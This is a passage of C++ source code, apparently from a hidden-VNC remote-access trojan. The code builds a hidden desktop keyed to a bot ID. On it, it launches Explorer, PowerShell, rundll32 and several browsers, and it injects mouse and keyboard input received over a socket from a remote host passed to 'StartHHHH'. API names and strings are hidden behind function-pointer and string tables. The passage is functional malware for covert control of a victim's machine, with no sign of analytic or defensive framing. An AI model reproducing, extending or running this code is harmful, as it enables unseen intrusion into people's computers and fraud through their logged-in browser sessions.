            Funcs::pRegOpenKeyExA(HKEY_CURRENT_USER, Strs::hd3, 0, KEY_ALL_ACCESS, &hKey);
            DWORD value;
            DWORD size = sizeof(DWORD);
            DWORD type = REG_DWORD;
            Funcs::pRegQueryValueExA(hKey, valueName, 0, &type, (BYTE *)&value, &size);

            if (value != neverCombine)
                Funcs::pRegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE *)&neverCombine, size);

            char explorerPath[MAX_PATH] = { 0 };
            Funcs::pGetWindowsDirectoryA(explorerPath, MAX_PATH);
            Funcs::pLstrcatA(explorerPath, Strs::fileDiv);
            Funcs::pLstrcatA(explorerPath, Strs::explorerExe);

            STARTUPINFOA startupInfo = { 0 };
            startupInfo.cb = sizeof(startupInfo);
            startupInfo.lpDesktop = g_desktopName;
            PROCESS_INFORMATION processInfo = { 0 };
            Funcs::pCreateProcessA(explorerPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);

            APPBARDATA appbarData;
            appbarData.cbSize = sizeof(appbarData);
            for (int i = 0; i < 5; ++i)
            {
                Sleep(1000);
                appbarData.hWnd = Funcs::pFindWindowA(Strs::shell_TrayWnd, NULL);
                if (appbarData.hWnd)
                    break;
            }

            appbarData.lParam = ABS_ALWAYSONTOP;
            Funcs::pSHAppBarMessage(ABM_SETSTATE, &appbarData);

            Funcs::pRegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE *)&value, size);
            Funcs::pRegCloseKey(hKey);
            break;
        }
        case WmStartApp::startRun:
        {
            char rundllPath[MAX_PATH] = { 0 };
            Funcs::pSHGetFolderPathA(NULL, CSIDL_SYSTEM, NULL, 0, rundllPath);
            lstrcatA(rundllPath, Strs::hd2);

            STARTUPINFOA startupInfo = { 0 };
            startupInfo.cb = sizeof(startupInfo);
            startupInfo.lpDesktop = g_desktopName;
            PROCESS_INFORMATION processInfo = { 0 };
            Funcs::pCreateProcessA(NULL, rundllPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
            break;
        }
        case WmStartApp::startPowershell:
        {
            StartPowershell();
            break;
        }
        case WmStartApp::startChrome:
        {
            StartChrome();
            break;
        }
        case WmStartApp::startEdge:
        {
            StartEdge();
            break;
        }
        case WmStartApp::startBrave:
        {
            StartBrave();
            break;
        }
        case WmStartApp::startFirefox:
        {
            StartFirefox();
            break;
        }
        case WmStartApp::startIexplore:
        {
            StartIe();
            break;
        }
        case WM_CHAR:
        case WM_KEYDOWN:
        case WM_KEYUP:
        case WM_SYSCHAR:
        case WM_SYSKEYDOWN:
        case WM_SYSKEYUP:
        {
            point = lastPoint;
            hWnd = GetFocus();
            if (!hWnd)
                hWnd = GetForegroundWindow();
            if (!hWnd)
                hWnd = g_lastInputHwnd;
            if (!hWnd)
                hWnd = Funcs::pWindowFromPoint(point);
            break;
        }
        default:
        {
            mouseMsg = TRUE;
            point.x = GET_X_LPARAM(lParam);
            point.y = GET_Y_LPARAM(lParam);
            lastPointCopy = lastPoint;
            lastPoint = point;

            hWnd = Funcs::pWindowFromPoint(point);
            if (!hWnd)
            {
                POINT emptyPoint = { 0, 0 };
                if (ShouldLogInput(msg))
                    LogInputTarget("drop-no-window", msg, NULL, point, emptyPoint, FALSE);
                continue;
            }

            if (msg == WM_LBUTTONUP)
            {
                lmouseDown = FALSE;
                LRESULT lResult = Funcs::pSendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);

                HWND topHwnd = hWnd;
                while ((Funcs::pGetWindowLongA(topHwnd, GWL_STYLE) & WS_CHILD))
                {
                    HWND p = Funcs::pGetParent(topHwnd);
                    if (!p) break;
                    topHwnd = p;
                }

                switch (lResult)
                {
                case HTCLOSE:
                {
                    Funcs::pPostMessageA(topHwnd, WM_CLOSE, 0, 0);
                    break;
                }
                case HTMINBUTTON:
                {
                    Funcs::pPostMessageA(topHwnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
                    break;
                }
                case HTMAXBUTTON:
                {
                    WINDOWPLACEMENT windowPlacement;
                    windowPlacement.length = sizeof(windowPlacement);
                    Funcs::pGetWindowPlacement(topHwnd, &windowPlacement);
                    if (windowPlacement.flags & SW_SHOWMAXIMIZED)
                        Funcs::pPostMessageA(topHwnd, WM_SYSCOMMAND, SC_RESTORE, 0);
                    else
                        Funcs::pPostMessageA(topHwnd, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
                    break;
                }
                }
            }
            else if (msg == WM_LBUTTONDOWN)
            {
                lmouseDown = TRUE;
                hResMoveWindow = NULL;
                g_lastInputHwnd = hWnd;

                HWND topFocusHwnd = GetTopLevelWindow(hWnd);
                BOOL bringResult = topFocusHwnd ? BringWindowToTop(topFocusHwnd) : FALSE;
                BOOL foregroundResult = topFocusHwnd ? SetForegroundWindow(topFocusHwnd) : FALSE;
                HWND activeResult = topFocusHwnd ? SetActiveWindow(topFocusHwnd) : NULL;
                HWND focusResult = SetFocus(hWnd);
                if (ShouldLogInput(msg))
                {
                    char className[128];
                    char title[128];
                    DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
                    printf("[input] focus WM_LBUTTONDOWN target=0x%p top=0x%p class='%s' title='%s' bring=%d foreground=%d active=0x%p focus=0x%p lastError=%lu\n",
                        hWnd,
                        topFocusHwnd,
                        className,
                        title,
                        bringResult,
                        foregroundResult,
                        activeResult,
                        focusResult,
                        GetLastError());
                }

                RECT startButtonRect;
                HWND hStartButton = Funcs::pFindWindowA("Button", NULL);
                if (hStartButton && Funcs::pGetWindowRect(hStartButton, &startButtonRect) && Funcs::pPtInRect(&startButtonRect, point))
                {
                    BOOL posted = Funcs::pPostMessageA(hStartButton, BM_CLICK, 0, 0);
                    if (ShouldLogInput(msg))
                        LogInputTarget("start-button", msg, hStartButton, point, point, posted);
                    continue;
                }
                else
                {
                    char windowClass[MAX_PATH] = { 0 };
                    Funcs::pRealGetWindowClassA(hWnd, windowClass, MAX_PATH);

                    if (!Funcs::pLstrcmpA(windowClass, Strs::hd1))
                    {
                        HMENU hMenu = (HMENU)Funcs::pSendMessageA(hWnd, MN_GETHMENU, 0, 0);
                        int itemPos = Funcs::pMenuItemFromPoint(NULL, hMenu, point);
                        int itemId = Funcs::pGetMenuItemID(hMenu, itemPos);
                        Funcs::pPostMessageA(hWnd, 0x1e5, itemPos, 0);
                        Funcs::pPostMessageA(hWnd, WM_KEYDOWN, VK_RETURN, 0);
                        continue;
                    }
                }
            }
            else if (msg == WM_MOUSEMOVE)
            {
                if (!lmouseDown)
                    continue;

                if (!hResMoveWindow)
                {
                    resMoveType = Funcs::pSendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);
                    while ((Funcs::pGetWindowLongA(hWnd, GWL_STYLE) & WS_CHILD))
                    {
                        HWND p = Funcs::pGetParent(hWnd);
                        if (!p) break;
                        hWnd = p;
                    }
                }
                else
                    hWnd = hResMoveWindow;

                int moveX = lastPointCopy.x - point.x;
                int moveY = lastPointCopy.y - point.y;

                RECT rect;
                Funcs::pGetWindowRect(hWnd, &rect);

                int x = rect.left;
                int y = rect.top;
                int width = rect.right - rect.left;
                int height = rect.bottom - rect.top;
                switch (resMoveType)
                {
                case HTCAPTION:
                {
                    x -= moveX;
                    y -= moveY;
                    break;
                }
                case HTTOP:
                {
                    y -= moveY;
                    height += moveY;
                    break;
                }
                case HTBOTTOM:
                {
                    height -= moveY;
                    break;
                }
                case HTLEFT:
                {
                    x -= moveX;
                    width += moveX;
                    break;
                }
                case HTRIGHT:
                {
                    width -= moveX;
                    break;
                }
                case HTTOPLEFT:
                {
                    y -= moveY;
                    height += moveY;
                    x -= moveX;
                    width += moveX;
                    break;
                }
                case HTTOPRIGHT:
                {
                    y -= moveY;
                    height += moveY;
                    width -= moveX;
                    break;
                }
                case HTBOTTOMLEFT:
                {
                    height -= moveY;
                    x -= moveX;
                    width += moveX;
                    break;
                }
                case HTBOTTOMRIGHT:
                {
                    height -= moveY;
                    width -= moveX;
                    break;
                }
                default:
                    continue;
                }
                Funcs::pMoveWindow(hWnd, x, y, width, height, FALSE);
                hResMoveWindow = hWnd;
                continue;
            }
            break;
        }
        }

        POINT screenPoint = point;
        POINT clientPt = { 0, 0 };

        if (!hWnd)
        {
            if (ShouldLogInput(msg))
                LogInputTarget("drop-no-target", msg, NULL, screenPoint, clientPt, FALSE);
            continue;
        }

        if (mouseMsg)
        {
            for (HWND currHwnd = hWnd;;)
            {
                hWnd = currHwnd;
                Funcs::pScreenToClient(currHwnd, &point);
                currHwnd = Funcs::pChildWindowFromPoint(currHwnd, point);
                if (!currHwnd || currHwnd == hWnd)
                    break;
            }

            if (msg != WM_MOUSEMOVE)
            {
                while ((Funcs::pGetWindowLongA(hWnd, GWL_STYLE) & WS_CHILD) &&
                    (Funcs::pGetWindowLongA(hWnd, GWL_EXSTYLE) & WS_EX_NOREDIRECTIONBITMAP))
                {
                    HWND parent = Funcs::pGetParent(hWnd);
                    if (!parent)
                        break;
                    hWnd = parent;
                }
            }

            clientPt = screenPoint;
            Funcs::pScreenToClient(hWnd, &clientPt);
            if (msg != WM_MOUSEWHEEL)
                lParam = MAKELPARAM(clientPt.x, clientPt.y);
            g_lastInputHwnd = hWnd;

            if (msg == WM_LBUTTONDOWN)
            {
                HWND finalFocusResult = SetFocus(hWnd);
                if (ShouldLogInput(msg))
                {
                    char className[128];
                    char title[128];
                    DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
                    printf("[input] final-focus WM_LBUTTONDOWN hwnd=0x%p class='%s' title='%s' focus=0x%p lastError=%lu\n",
                        hWnd,
                        className,
                        title,
                        finalFocusResult,
                        GetLastError());
                }
            }
        }
        else
        {
            clientPt = screenPoint;
        }

        SetLastError(0);
        BOOL posted = Funcs::pPostMessageA(hWnd, msg, wParam, lParam);
        if (ShouldLogInput(msg))
            LogInputTarget("post", msg, hWnd, screenPoint, clientPt, posted);
    }
exit:
    printf("[!] Input thread exiting\n");
    if (s)
        Funcs::pClosesocket(s);
    if (g_hDesktopThread)
        Funcs::pTerminateThread(g_hDesktopThread, 0);
    return 0;
}

static DWORD WINAPI MainThread(LPVOID param)
{
    Funcs::pMemset(g_desktopName, 0, sizeof(g_desktopName));
    GetBotId(g_desktopName);
    printf("[diag] Hidden desktop name: %s\n", g_desktopName);

    Funcs::pMemset(&g_bmpInfo, 0, sizeof(g_bmpInfo));
    g_bmpInfo.bmiHeader.biSize = sizeof(g_bmpInfo.bmiHeader);
    g_bmpInfo.bmiHeader.biPlanes = 1;
    g_bmpInfo.bmiHeader.biBitCount = 24;
    g_bmpInfo.bmiHeader.biCompression = BI_RGB;
    g_bmpInfo.bmiHeader.biClrUsed = 0;

    GdiplusStartupInput gdiplusStartupInput;
    if (GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL) == Ok)
        g_gdiplusStarted = TRUE;
    printf("[diag] GDI+ startup: %s\n", g_gdiplusStarted ? "ok" : "failed");

    g_hDesk = Funcs::pOpenDesktopA(g_desktopName, 0, TRUE, GENERIC_ALL);
    if (!g_hDesk)
    {
        printf("[diag] OpenDesktop failed; creating hidden desktop\n");
        g_hDesk = Funcs::pCreateDesktopA(g_desktopName, NULL, NULL, 0, GENERIC_ALL, NULL);
    }
    else
        printf("[diag] OpenDesktop succeeded\n");

    if (!g_hDesk)
        printf("[!] CreateDesktop/OpenDesktop failed: GetLastError=%lu\n", Funcs::pGetLastError());
    else
        printf("[+] Hidden desktop ready: handle=0x%p\n", g_hDesk);

    if (g_hDesk && Funcs::pSetThreadDesktop(g_hDesk))
        printf("[diag] Main thread attached to hidden desktop\n");
    else
        printf("[!] Main thread SetThreadDesktop failed: GetLastError=%lu\n", Funcs::pGetLastError());

    g_hInputThread = Funcs::pCreateThread(NULL, 0, InputThread, NULL, 0, 0);
    if (g_hInputThread)
        printf("[diag] Input thread created\n");
    else
        printf("[!] Input thread creation failed: GetLastError=%lu\n", Funcs::pGetLastError());

    if (g_hInputThread)
        Funcs::pWaitForSingleObject(g_hInputThread, INFINITE);
    if (g_hDesktopThread)
        Funcs::pWaitForSingleObject(g_hDesktopThread, INFINITE);

    if (g_gdiplusStarted)
    {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusStarted = FALSE;
    }

    FreePixelBuffers();

    if (g_hInputThread)
        Funcs::pCloseHandle(g_hInputThread);
    if (g_hDesktopThread)
        Funcs::pCloseHandle(g_hDesktopThread);

    g_hInputThread = NULL;
    g_hDesktopThread = NULL;
    g_started = FALSE;
    printf("[diag] Main thread cleanup complete\n");
    return 0;
}

HANDLE StartHHHH(const char *host, int port)
{
    if (g_started)
        return NULL;
    Funcs::pLstrcpyA(g_host, host);
    g_port = port;
    printf("[diag] StartHHHH requested for %s:%d\n", g_host, g_port);
    g_started = TRUE;
    HANDLE hThread = Funcs::pCreateThread(NULL, 0, MainThread, NULL, 0, 0);
    printf("[diag] Main thread handle: 0x%p\n", hThread);
    return hThread;
}
